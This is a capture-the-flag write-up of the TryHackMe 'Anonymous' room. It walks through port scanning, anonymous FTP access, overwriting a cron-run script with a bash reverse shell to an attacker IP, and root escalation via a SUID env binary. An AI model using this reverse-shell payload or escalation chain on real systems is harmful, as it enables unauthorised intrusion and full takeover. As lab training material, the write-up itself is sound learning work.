Challenge link → https://tryhackme.com/room/anonymous

# Anonymous — TryHackMe Write-up

First, I performed a port scan — the most fundamental step in information gathering.

> The `--min-rate 5000` option was used to speed up the scan, and `-p-` checks all ports (1–65535).
> 

```
nmap -sS --min-rate 5000 -p- 10.201.43.68
```

![1](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/1.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)

The scan results showed 4 open ports — the answer to Q1. The remaining 65,531 ports were closed or filtered.

Since SSH is generally difficult to use as an initial attack vector, I decided to focus on the FTP and SMB services.

**Q1: How many ports are open?**

**Answer: 4**

Next, I performed a service version scan.

> The `-sC` option runs default NSE scripts, and `-sV` detects service versions.
> 

```
nmap -sC -sV -p 21,22,139,445 10.201.43.68
```

![2](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/2.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)

The scan results easily revealed the answers to Q2 and Q3.

It was also interesting that the hostname was "ANONYMOUS" — this could be a hint related to anonymous access.

**Q2: What service is running on port 21?**

**Answer: ftp**

**Q3: What service is running on ports 139 and 445?**

**Answer: smb**

I checked the SMB service first.

> Used smbclient to list shared folders.
> 

```
smbclient -L //10.201.43.68 -N
```

I found a shared folder called "pics" — the answer to Q4.

Accessing it, I found two image files: corgo2.jpg and puppos.jpeg.

Suspecting steganography, I analyzed them with tools like strings and binwalk, but found no hidden data.

**Q4: There's a share on the user's computer. What's it called?**

**Answer: pics**

Next, I attempted anonymous login to the FTP service.

Given the hostname was "ANONYMOUS", I judged it likely that anonymous access would be permitted.

```yaml
ftp 10.201.43.68
Name: anonymous
Password: (press Enter)
```

As expected, anonymous access was allowed. Using the `ls` command, I discovered a `scripts` directory and navigated into it to check the files.

```bash
ftp> cd scripts
ftp> ls
```

I found 3 files in the scripts directory.

I downloaded each file to inspect its contents.

```csharp
ftp> get clean.sh
ftp> get removed_files.log
ftp> get to_do.txt
```

###

I checked the file contents using the `cat clean.sh` command.

![3](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/3.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)

```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
    echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log
    done
fi
```

After inspecting the file, this is what the script does:

1. Initializes the tmp_files variable to 0
2. If the value is 0, it logs "nothing to delete" to removed_files.log
3. If not 0, it deletes those files and logs each deletion
4. The log file path is specified as an absolute path: /var/ftp/scripts/removed_files.log

This script is most likely running automatically on the server.

Next, I looked at removed_files.log.

![4](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/4.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)

The log file had "Running cleanup script: nothing to delete" repeated dozens of times. There were no timestamps in the log, so I couldn't determine the exact execution interval, but the repeated messages showed that [clean.sh](http://clean.sh) was running periodically.

The last modified time being very recent — October 5th at 09:45 — also supports that the cron job is still active.

Next, I looked at to_do.txt.

![5](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/5.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)

```visual-basic
I really need to disable the anonymous login...it's really not safe
```

A note, seemingly written by the admin, confirmed that anonymous login needed to be disabled. However, written in May 2020, it appears this was never actually done. This indicates that security settings have not been properly managed.

Putting together what I've gathered so far:

1. Anonymous FTP access is available
2. Need to verify if FTP directory has write permissions
3. [clean.sh](http://clean.sh) runs periodically as a cron job
4. If I can modify [clean.sh](http://clean.sh), I can obtain a reverse shell

Based on these points, I decided to modify [clean.sh](http://clean.sh) to test FTP write permissions. If write access exists, I can replace it with a malicious script and obtain a reverse shell when the cron job executes.

I created a new [clean.sh](http://clean.sh) on my local system containing a bash reverse shell payload.

![6](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/6.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)

```bash
cd ~
echo '#!/bin/bash' > clean.sh
echo 'bash -i >& /dev/tcp/10.9.0.106/4444 0>&1' >> clean.sh
chmod +x clean.sh
cat clean.sh
```

Payload breakdown:

- `bash -i`: launches an interactive bash shell
- `>&`: redirects stdout and stderr
- `/dev/tcp/10.9.0.106/4444`: TCP connection to attacker IP and port
- `0>&1`: redirects stdin to stdout

This causes the server to connect a shell back to port 4444 on the attacker's system.

Note: 10.9.0.106 is the IP address of the VPN interface (tun0).

I uploaded the malicious script to the FTP server.

![7](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/7.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)

```yaml
ftp 10.201.43.68
Name: anonymous
Password: (Enter)
ftp> cd scripts
ftp> put clean.sh
```

The upload completed successfully. The file size changed from the original 314 bytes to 53 bytes, confirming the original file was replaced with our payload.

Write permissions on FTP were confirmed, so all that was left was to wait for the cron job to execute.

I set up a netcat listener to receive the reverse shell connection.

```
nc -lvnp 4444
```

![8](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/8.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)

The exact execution interval of the cron job was unknown, but after waiting approximately 1–5 minutes, the server established the reverse shell connection. When the connection succeeds, the following message is displayed:

```
Listening on 0.0.0.0 4444
Connection received on 10.201.43.68 40760
```

###

After obtaining the shell, I checked my current location and privileges.

![9](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/9.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)

```markdown
whoami
# namelessone

pwd
# /home/namelessone

ls
# pics
# user.txt

cat user.txt
# 90d6f99*************************740
```

I obtained a shell as the user namelessone and found the user.txt flag in the home directory.

**Q5: user.txt**

**Answer: 90d6f99...740**

###

Next, to escalate from a regular user to root, I searched for files with the SUID (Set User ID) bit set. Files with SUID execute with the file owner's permissions, so exploiting a root-owned SUID file enables privilege escalation.

```tsx
find / -perm -4000 -type f 2>/dev/null
```

Command breakdown:

- `find /`: search from the root directory
- `-perm -4000`: files with the SUID bit (4000) set
- `-type f`: regular files only
- `2>/dev/null`: suppress error messages

![10](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/10.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)

Several SUID files were found in the results:

- /usr/bin/passwd — expected (needed for password changes)
- /usr/bin/su — expected (needed for user switching)
- /usr/bin/env — **abnormal** (SUID not normally needed here)
- Other system binaries

Having SUID set on `/usr/bin/env` is abnormal. `env` is a utility for setting environment variables and running programs — it generally has no need for SUID. This is a clear privilege escalation vector.

### Privilege Escalation via env

GTFOBins (https://gtfobins.github.io/) is a site that documents methods for exploiting Unix binaries to bypass security controls. Referencing the SUID section for `env`, the exploit method is as follows:

![11](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/11.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)

```python
/usr/bin/env /bin/sh -p
```

Command breakdown:

- `/usr/bin/env`: run the SUID-set env binary
- `/bin/sh`: launch a shell through env
- `-p`: privileged mode (preserves SUID permissions)

When env runs with SUID, it holds root privileges, and executing `/bin/sh -p` through it launches a shell that maintains those root privileges. The `-p` flag is essential — without it, the shell may revert to the actual user's privileges.

![12](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/12.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)

```markdown
whoami
# root

cat /root/root.txt
# 4d93009*************************363
```

Privilege escalation succeeded and root access was obtained. I accessed the /root directory and confirmed the root.txt flag.

**Q6: root.txt**

**Answer: 4d93009...363**
